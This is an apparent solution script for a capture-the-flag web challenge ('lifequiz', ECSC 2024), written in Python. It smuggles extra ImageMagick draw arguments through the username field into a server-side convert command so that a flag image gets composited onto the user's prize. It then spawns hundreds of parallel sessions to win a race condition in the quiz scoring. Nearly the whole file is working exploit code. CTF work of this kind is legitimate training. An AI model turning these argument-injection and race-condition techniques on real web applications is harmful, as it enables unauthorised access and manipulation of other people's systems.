import re
import time
import random
import sys
import string
import requests
import multiprocessing
from bs4 import BeautifulSoup


CHALL_URL = "http://lifequiz.challs.open.ecsc2024.it"
#CHALL_URL = "http://localhost:8000"
email = ''.join(random.choice(string.ascii_letters) for _ in range(10)) 
# Payload in the username
# Server command: 
# convert -draw " . escapeshellarg("text 0,1219 \"$username\"") . " -pointsize 100 -gravity Center /trophy.jpg /prizes/$user.jpg &
username = '"image Over 0,0 0,0"/prizes/flag.jpg'
# Number of bruteforcing requests
CHILDS = 500
session = requests.Session()

# Questions and answers
questions = {
    'What is the meaning of life?': ["42", "There is no meaning", "To be happy", "To help others"],
    'What is the purpose of art?': ["To express emotions", "To make money", "To make people think", "To make people happy"],
    'What is the best way to live?': ["To be free", "To be rich", "To be healthy", "To be happy"],
    'Is this a random question?': ["Yes", "No", "Maybe", "I don't know"],
    'Where is the best place to live?': ["In the city", "In the country", "In the mountains", "In the beach"]
}


def register():
    """ Register an account on the platform """
    global session
    global email
    global username
    global password
    # Login
    print(f"""
        [REGISTER] {email}
          """)
    login_data = {
        'username': username, 
        'email': email
    }
    
    r = session.post(CHALL_URL + "/login.php", data=login_data)
    assert r.status_code == 200
    soup = BeautifulSoup(r.content, "html.parser")
    password = soup.find_all('div', class_='alert alert-success')[0].text 
    password = re.findall(r'".{16}"', password)[0][1:-1]
    print(f"[LOGGED] {email} : {password}")


def login():
    """ login with creds on the platform """
    global session
    global email
    global password
    # Login
    login_data = {
        'email': email, 
        'password': password
    }
    
    r = session.post(CHALL_URL + "/login.php", data=login_data)
    assert r.status_code == 200


def call_reset():
    """ Calling Quiz reset """
    global session
    session.get(CHALL_URL + "/reset.php")


def answer_quiz(answer):
    """ Register an answer into the quiz """
    global session
    data = {
        "answer":answer
    }
    r = session.post(CHALL_URL + "/quiz.php", data=data)
    # Just for checking
    #if "Incorrect" in r.text:
    #    soup = BeautifulSoup(r.content, "html.parser")
    #    data = soup.find_all("input")[0]["value"]


def check_points():
    """ Checking how many points an account has on the platform """
    r = session.get(CHALL_URL + "/quiz.php")
    try:
        points = re.findall(r'You have \d{0,3} points', r.text)[0]
        points_number = re.findall(r"\d{1,3}",points)[0]
    except IndexError:
        return 0
    return points_number


def bruteforce():
    """ 
        Method that logs with a new PHPSESSID and tries to guess the quiz.
        For making the race condition.
    """
    try:
        session2 = requests.Session()
        login_data = {
            'email': email, 
            'password': password
        }
        r = session2.post(CHALL_URL + "/login.php", data=login_data)
        for i in range(1,16):
            index = ((i - 1) % 5)
            data = {"answer": questions[list(questions.keys())[index]][0]}
            session2.post(CHALL_URL + '/quiz.php', data=data)    
    except Exception:
        return


def spawn_childs(CHILDS=100):
    """ Spawn childs for exploiting the race condition"""
    for i in range(CHILDS):
        p = multiprocessing.Process(target=bruteforce)
        p.start()


# ------------------- MAIN
CHILDS = 500
register()
login()
try_number = 0
while True:
    spawn_childs(CHILDS)
    time.sleep(10)
    points = check_points()
    print(f"[PUNTOS][TRY: {try_number}] --> {points}")
    if int(points) >= 15:
        print("-"*30)
        print(f"[DONE] Login and get your flag. Creds --> {email} : {password}")
        print("-"*30)
        sys.exit()
    try_number += 1
    call_reset()
